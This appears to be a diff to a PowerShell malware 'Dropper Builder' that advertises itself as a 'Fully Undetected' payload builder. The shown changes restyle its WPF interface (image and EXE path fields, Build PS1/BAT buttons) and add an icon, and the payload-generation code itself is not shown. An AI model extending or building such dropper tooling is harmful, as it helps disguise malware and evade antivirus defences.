@@ -34,31 +34,43 @@ Add-Type -TypeDefinition $CSHARP -Language CSharp
 '@
 
 $inputXML = @'
-<Window x:Class="GUI_TEST.MainWindow"
+<Window x:Class="GUI_TEST.MainWindow" Icon="logo.ico"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
         xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
         xmlns:local="clr-namespace:GUI_TEST"
         mc:Ignorable="d"
-        Title="Dropper Builder | K.Dot#4044" Height="470" Width="818">
-    <Grid x:Name="Name_Thing">
-        <TextBox HorizontalAlignment="Left" Height="46" Margin="10,5,0,0" TextWrapping="Wrap" Text="FUD (Fully Undetected) Payload Builder by K.Dot#4044 and Godfather" VerticalAlignment="Top" Width="330" IsReadOnly="True"/>
-        <TextBox x:Name="IMAGE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,90,0,0" TextWrapping="Wrap" Text="..." VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
-        <TextBox x:Name="EXE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,171,0,0" TextWrapping="Wrap" Text="..." VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
-        <TextBox x:Name="OUTPUT_BOX" HorizontalAlignment="Left" Height="207" Margin="306,217,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="484" Grid.ColumnSpan="2"/>
-        <Label Content="IMAGE PATH" HorizontalAlignment="Left" Height="29" Margin="10,56,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
-        <Label Content="EXE PATH" HorizontalAlignment="Left" Height="29" Margin="10,137,0,0" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
-        <Label Content="OUTPUT" HorizontalAlignment="Left" Height="28" Margin="517,189,0,0" VerticalAlignment="Top" Width="62"/>
-        <Button x:Name="FIND_IMAGE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,90,0,0" VerticalAlignment="Top" Width="62"/>
-        <Button x:Name="FIND_EXE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,171,0,0" VerticalAlignment="Top" Width="62"/>
-        <Button x:Name="ps1_button" Content="Build PS1" HorizontalAlignment="Left" Height="207" Margin="10,217,0,0" VerticalAlignment="Top" Width="133"/>
-        <Button x:Name="Bat_Button" Content="Build BAT" HorizontalAlignment="Left" Height="207" Margin="155,217,0,0" VerticalAlignment="Top" Width="133"/>
-        <Image HorizontalAlignment="Left" Height="156" Margin="634,10,0,0" VerticalAlignment="Top" Width="156" Source="comethazine.png"/>
-
+        Title="Dropper Builder | K.Dot#4044" Height="470" Width="818" WindowStyle="SingleBorderWindow" ResizeMode="NoResize">
+    <Grid x:Name="Name_Thing" Background="#846DCF">
+        <TextBox HorizontalAlignment="Left" Height="56" Margin="10,5,0,0" TextWrapping="Wrap" Text="FUD (Fully Undetected) Payload Builder by K.Dot#4044 and Godfather" VerticalAlignment="Top" Width="399" IsReadOnly="True" FontSize="18" BorderThickness="4,4,4,4" Background="Black" Foreground="White" IsHitTestVisible="False">
+            <TextBox.BorderBrush>
+                <SolidColorBrush Color="#FF1AFB00" Opacity="1"/>
+            </TextBox.BorderBrush>
+        </TextBox>
+        <TextBox x:Name="IMAGE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,90,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
+        <TextBox x:Name="EXE_PATH_SHOW" HorizontalAlignment="Left" Height="28" Margin="10,171,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="423" Grid.ColumnSpan="2"/>
+        <TextBox x:Name="OUTPUT_BOX" HorizontalAlignment="Left" Height="207" Margin="306,217,0,0" TextWrapping="Wrap" VerticalAlignment="Top" Width="484" Grid.ColumnSpan="2" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
+        <Label Content="IMAGE PATH" HorizontalAlignment="Left" Height="29" Margin="10,61,0,0" VerticalAlignment="Top" Width="423" FontFamily="Arial Black"/>
+        <Label Content="EXE PATH" HorizontalAlignment="Left" Height="29" Margin="10,142,0,0" VerticalAlignment="Top" Width="423" FontFamily="Segoe UI Black"/>
+        <Label Content="OUTPUT" HorizontalAlignment="Left" Height="28" Margin="516,189,0,0" VerticalAlignment="Top" Width="64" FontFamily="Impact" FontSize="18"/>
+        <Button x:Name="FIND_IMAGE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,90,0,0" VerticalAlignment="Top" Width="62" Background="#FF00FC00" FontFamily="Sitka Text Semibold"/>
+        <Button x:Name="FIND_EXE" Content="Find" HorizontalAlignment="Left" Height="28" Margin="438,171,0,0" VerticalAlignment="Top" Width="62" Background="Lime" FontFamily="Sitka Text Semibold"/>
+        <Button x:Name="ps1_button" Content="Build PS1" HorizontalAlignment="Left" Height="207" Margin="10,217,0,0" VerticalAlignment="Top" Width="133" FontFamily="Sitka Text Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4">
+            <Button.Style>
+                <Style TargetType="{x:Type Button}">
+                    <Style.Triggers>
+                        <Trigger Property="IsMouseOver" Value="True">
+                            <Setter Property="Background" Value="Aqua"/>
+                        </Trigger>
+                    </Style.Triggers>
+                </Style>
+            </Button.Style>
+        </Button>
+        <Button x:Name="Bat_Button" Content="Build BAT" HorizontalAlignment="Left" Height="207" Margin="155,217,0,0" VerticalAlignment="Top" Width="133" FontFamily="Sitka Small Semibold" FontSize="20" Background="Black" Foreground="White" BorderBrush="#FF1AFB00" BorderThickness="4,4,4,4"/>
+        <Image HorizontalAlignment="Left" Height="189" Margin="604,11,0,0" VerticalAlignment="Top" Width="186" Source="comethazine.png"/>
     </Grid>
 </Window>
-
 '@
 
 function New-random_string {
@@ -140,9 +152,11 @@ function build {
 }
 
 $image_name = "comethazine.png"
+$icon_name = "logo.ico" # doesn't even work smh
 $working_dir = Get-Location
-$image_name_path = "$working_dir\$image_name"
-$inputXML = $inputXML -replace 'mc:Ignorable="d"', '' -replace "x:N", 'N' -replace '^<Win.*', '<Window' -replace 'comethazine.png', $image_name_path
+$image_name_path = "$working_dir\assets\$image_name"
+$icon_name_path = "$working_dir\assets\$icon_name"
+$inputXML = $inputXML -replace 'mc:Ignorable="d"', '' -replace "x:N", 'N' -replace '^<Win.*', '<Window' -replace 'comethazine.png', $image_name_path -replace 'logo.ico', $icon_name_path
 [XML]$XAML = $inputXML
 
 $reader = (New-Object System.Xml.XmlNodeReader $xaml)
@@ -152,6 +166,10 @@ try {
     Write-Warning $_.Exception
     throw
 }
+
+$Window.add_Loaded({
+    $Window.Icon = $icon_name_path
+})
 
 $xaml.SelectNodes("//*[@Name]") | ForEach-Object {
     try {
